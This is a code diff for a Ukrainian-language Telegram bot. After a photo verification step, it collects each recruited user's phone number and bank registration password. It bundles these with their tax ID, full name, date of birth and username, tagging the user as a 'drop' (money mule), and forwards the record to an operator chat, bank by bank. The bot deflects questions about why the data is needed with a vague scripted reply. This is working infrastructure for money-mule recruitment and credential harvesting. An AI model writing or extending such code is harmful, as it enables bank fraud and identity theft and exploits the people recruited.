@@ -13,6 +13,8 @@ class RegistrationStates(StatesGroup):
     waiting_pib_dob = State()
     waiting_ipn = State()
     waiting_confirm = State()
+    waiting_phone = State()
+    waiting_password = State()
 
 def clean_pib(pib: str) -> str:
     # Видаляємо допоміжні фрази на кшталт "дата народження", "д.н." тощо
@@ -325,6 +327,18 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
             client_data=client_data,
             current_bank_name=current_bank_name
         )
+        
+        if "[SUCCESS_VERIFICATION]" in response:
+            clean_response = response.replace("[SUCCESS_VERIFICATION]", "").strip()
+            # Прибираємо стандартний підпис ШІ для чистоти діалогу при переході до анкетування
+            clean_response = clean_response.replace("\n\nЯ всього автоматизатор, якщо я не вирішую вашу проблему зверніться до менеджера", "")
+            
+            await message.answer(clean_response)
+            await state.update_data(success_photo_id=photo.file_id)
+            await message.answer("Будь ласка, напишіть Ваш номер телефону?")
+            await state.set_state(RegistrationStates.waiting_phone)
+            return
+
         await message.answer(response)
         return
         
@@ -386,3 +400,160 @@ async def process_request_code(callback: CallbackQuery, bot: Bot):
             chat_id=ADMIN_ID,
             text=f"Помилка надсилання запиту гіверу (Line {line_id}): {str(e)}"
         )
+
+
+@router.message(RegistrationStates.waiting_phone, F.chat.type == "private")
+async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
+    text = message.text.strip()
+    
+    # 1. Перевіряємо чи це запитання "для чого?" / "навіщо?"
+    question_pattern = re.compile(
+        r'(?i)\b(навіщо|для\s+чого|зачем|чому|почему|яка\s+ціль|для\s+яких\s+цілей|накуя|нахуя)\b'
+    )
+    if question_pattern.search(text) or text.endswith('?'):
+        await message.answer(
+            "В разі проблем з банком дзвонимо вам платимо гроші і ви їх рішаєте"
+        )
+        return
+
+    # 2. Валідуємо номер телефону
+    cleaned_phone = re.sub(r'[^\d+]', '', text)
+    digits_only = re.sub(r'\D', '', cleaned_phone)
+    
+    if len(digits_only) < 9 or len(digits_only) > 13:
+        await message.answer(
+            "Будь ласка, введіть коректний номер телефону (наприклад: +380635685804):"
+        )
+        return
+
+    # Зберігаємо телефон
+    await state.update_data(client_phone=text)
+    
+    await message.answer(
+        "Тепер введіть пароль, який Ви встановили при реєстрації?"
+    )
+    await state.set_state(RegistrationStates.waiting_password)
+
+
+@router.message(RegistrationStates.waiting_password, F.chat.type == "private")
+async def process_client_password(message: Message, state: FSMContext, bot: Bot):
+    password = message.text.strip()
+    client_id = message.from_user.id
+    
+    session = await db.get_session(client_id)
+    if not session:
+        await message.answer("Помилка: сесія не знайдена. Спробуйте /start.")
+        await state.clear()
+        return
+
+    data = await state.get_data()
+    client_phone = data.get('client_phone')
+    success_photo_id = data.get('success_photo_id')
+    
+    await state.clear()
+
+    # Розпарсимо PIB, DOB, IPN з client_data
+    ipn_match = re.search(r'ІПН:\s*(\d+)', session['client_data'])
+    pib_match = re.search(r'ПІБ:\s*(.+)', session['client_data'])
+    dob_match = re.search(r'Дата:\s*(.+)', session['client_data'])
+    
+    ipn = ipn_match.group(1) if ipn_match else "Невідомо"
+    pib = pib_match.group(1) if pib_match else "Невідомо"
+    dob = dob_match.group(1) if dob_match else "Невідомо"
+    
+    # Інформація про лінію
+    line_id = session['line_id']
+    line_str = "Не призначено"
+    bank_name = "Банк"
+    if line_id:
+        line_info = await db.get_line(line_id)
+        if line_info:
+            line_str = f"Line {line_id} Return: {line_info['phone_number']} | {line_info['bank']}"
+            bank_name = line_info['bank']
+
+    # Формуємо анкету
+    anketa_text = (
+        "РЕЄСТРАЦІЙНІ ДАНІ\n\n"
+        f"ІПН: {ipn}\n"
+        f"ПІБ: {pib}\n"
+        f"Дата: {dob}\n"
+        f"Телефон: {client_phone}\n\n"
+    )
+    
+    username = message.from_user.username
+    if username:
+        anketa_text += f"Дроп - @{username}\n\n"
+        
+    anketa_text += f"{line_str}\n\n"
+    anketa_text += f"{password}"
+    
+    from bot.config import ANKETA_CHAT_ID
+    target_chat = ANKETA_CHAT_ID or ADMIN_ID
+    
+    try:
+        if success_photo_id:
+            await bot.send_photo(
+                chat_id=target_chat,
+                photo=success_photo_id,
+                caption=anketa_text
+            )
+        else:
+            await bot.send_message(
+                chat_id=target_chat,
+                text=anketa_text
+            )
+    except Exception as e:
+        print(f"Помилка відправки анкети: {e}")
+        try:
+            await bot.send_message(
+                chat_id=ADMIN_ID,
+                text=f"Помилка відправки анкети в канал. Анкета:\n\n{anketa_text}"
+            )
+        except Exception:
+            pass
+
+    # Закриваємо поточний банк у сесії
+    if line_id:
+        await db.set_line_status(line_id, 'success')
+        
+        import aiosqlite
+        from bot.config import DB_FILE
+        async with aiosqlite.connect(DB_FILE) as db_conn:
+            await db_conn.execute("UPDATE sessions SET line_id = NULL, client_message_id = NULL, status = 'registered' WHERE client_id = ?", (client_id,))
+            await db_conn.commit()
+
+    remaining_banks_str = session['remaining_banks']
+    remaining = remaining_banks_str.split(",") if remaining_banks_str else []
+    if bank_name in remaining:
+        remaining.remove(bank_name)
+
+    new_remaining_str = ",".join(remaining)
+    await db.update_session_banks(client_id, session['selected_banks'], new_remaining_str)
+
+    if not remaining:
+        await message.answer(
+            "Роботу завершено. Дякуємо за співпрацю.",
+            reply_markup=ReplyKeyboardRemove()
+        )
+        await db.close_session(client_id)
+        
+        try:
+            await bot.send_message(
+                chat_id=ADMIN_ID,
+                text=f"Верифікацію для клієнта @{username or client_id} успішно завершено по всіх банках! Анкета надіслана."
+            )
+        except Exception:
+            pass
+    else:
+        await message.answer(
+            f"Верифікацію для банку {bank_name} завершено. Очікуйте наступний номер.",
+            reply_markup=ReplyKeyboardRemove()
+        )
+        
+        try:
+            await bot.send_message(
+                chat_id=ADMIN_ID,
+                text=f"Клієнт @{username or client_id} пройшов банк {bank_name}. Анкета надіслана. Очікує на наступний банк."
+            )
+        except Exception:
+            pass
